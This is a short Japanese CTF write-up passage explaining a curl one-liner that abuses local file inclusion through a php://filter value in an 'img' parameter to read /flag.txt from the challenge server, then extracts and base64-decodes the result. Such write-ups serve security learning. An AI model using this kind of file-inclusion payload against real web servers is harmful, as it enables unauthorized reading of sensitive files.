ワンライナーで書くと以下のようになる。

```bash
curl -s "http://34.170.146.252:51136/?img=php://filter/resource=/flag.txt" | grep -oP 'data:text/plain;base64,\K[^"]+' | base64 -d
```

`php://filter/resource=/flag.txt`によってLFIを利用してflag.txtの内容を読み取ることができる。

curlで取得したHTMLからbase64エンコードされたflag.txtの内容をgrepで抜き取って、`base64 -d`でデコードすることでflagを得ることができるという流れである。